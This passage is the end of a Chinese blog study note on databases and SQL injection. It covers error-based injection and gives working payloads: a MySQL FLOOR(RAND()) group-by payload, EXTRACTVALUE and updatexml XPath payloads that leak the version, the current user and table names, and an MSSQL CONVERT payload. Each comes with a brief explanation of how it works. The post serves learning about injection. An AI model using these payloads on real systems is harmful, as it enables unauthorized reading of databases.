<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--</span><br></pre></td></tr></table></figure></div>

<p><em>原理</em>：<code>GROUP BY</code>与<code>RAND()</code>导致的重复键冲突</p>
</li>
<li><p><strong>XPATH报错（MySQL）</strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> EXTRACTVALUE(<span class="number">1</span>,CONCAT(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>))<span class="comment">--</span></span><br></pre></td></tr></table></figure></div>

<p><em>原理</em>：非法XPATH语法触发错误回显</p>
</li>
<li><p><strong>数据类型转换（MSSQL）</strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> (<span class="keyword">SELECT</span> @<span class="variable">@version</span> <span class="keyword">WHERE</span> <span class="number">1</span><span class="operator">=</span><span class="keyword">CONVERT</span>(<span class="type">int</span>,@<span class="variable">@version</span>))<span class="comment">--</span></span><br></pre></td></tr></table></figure></div>

<p><em>原理</em>：将版本号强制转为INT导致转换失败</p>
</li>
</ol>
<h4 id="优势："><a href="#优势：" class="headerlink" title="优势："></a>优势：</h4><ul>
<li><strong>无需字段回显位</strong></li>
<li><strong>可单次请求获取数据</strong>（如<code>updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)),1)</code>）</li>
</ul>

        </div>

        
            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>标题:</strong> 我要成为SQL糕手——数据库学习与SQL注入</li>
        <li><strong>作者:</strong> Wang1r</li>
        <li><strong>创建于
                :</strong> 2025-04-07 17:00:14</li>
        
            <li>
                <strong>更新于
                    :</strong> 2025-06-27 20:24:32
            </li>
        
        <li>
            <strong>链接:</strong> https://wang1rrr.github.io/2025/04/07/数据库学习与SQL注入/
        </li>
        <li>
            <strong>
                版权声明:
            </strong>
            

            
                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
            
        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">#基础知识</a>&nbsp;
                    </li>
                
            </ul>
        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2025/04/07/XYCTF2025web%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%9B%98/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">XYCTF2025web个人复盘</span>
                                <span class="post-nav-item">上一篇</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2025/04/06/%E6%98%A5%E6%97%A5%E3%80%81%E6%B5%B7%E6%A3%A0%E8%8A%82%E4%B8%8E%E7%BC%98/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">春日、海棠节与缘</span>
                                <span class="post-nav-item">下一篇</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">目录</div>
        <div class="page-title">我要成为SQL糕手——数据库学习与SQL注入</div>
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E4%B8%8E%E4%BB%A3%E6%95%B0%E6%9F%A5%E8%AF%A2%E8%AF%AD%E8%A8%80"><span class="nav-text">SQL与代数查询语言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C"><span class="nav-text">数据库操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E6%95%B0%E6%9F%A5%E8%AF%A2%E8%AF%AD%E8%A8%80%E7%9A%84%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5"><span class="nav-text">代数查询语言的核心概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E4%B8%AD%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="nav-text">SQL中的操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BA%A6%E6%9D%9F"><span class="nav-text">数据库约束</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E4%BE%9D%E8%B5%96"><span class="nav-text">函数依赖</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1"><span class="nav-text">数据库设计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A8%A1%E5%9E%8B%EF%BC%88E-R%E6%A8%A1%E5%9E%8B%EF%BC%89"><span class="nav-text">高级数据库模型（E&#x2F;R模型）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9F%E4%B8%8E%E8%A7%A6%E5%8F%91%E5%99%A8"><span class="nav-text">约束与触发器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%86%E5%9B%BE%E4%B8%8E%E7%B4%A2%E5%BC%95"><span class="nav-text">视图与索引</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84-SQL"><span class="nav-text">服务器环境下的 SQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E4%B8%8E%E7%94%A8%E6%88%B7%E6%8E%88%E6%9D%83"><span class="nav-text">安全与用户授权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A5%E5%BF%97"><span class="nav-text">日志</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6"><span class="nav-text">并发控制</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%9C%AC%E8%B4%A8%E4%B8%8E%E5%8E%9F%E7%90%86"><span class="nav-text">SQL注入的本质与原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A0%B9%E6%BA%90%EF%BC%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5%E9%99%B7%E9%98%B1"><span class="nav-text">漏洞根源：字符串拼接陷阱</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3"><span class="nav-text">SQL注入攻击技术详解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="nav-text">1. 基础注入手法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5-Union-Based-Injection"><span class="nav-text">一、联合注入 (Union-Based Injection)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E7%9B%B2%E6%B3%A8-Blind-Injection"><span class="nav-text">二、盲注 (Blind Injection)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-Stacked-Queries-Injection"><span class="nav-text">三、堆叠注入 (Stacked Queries Injection)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-Error-Based-Injection"><span class="nav-text">四、报错注入 (Error-Based Injection)</span></a></li></ol></li></ol></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Wang1r</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        共撰写了 23 篇文章
                    </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">访问人数</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">总访问量</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
        </div>
        
        
            <div>
                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>








    
<script src="/js/libs/anime.min.js"></script>





    
<script src="/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>




</body>
</html>
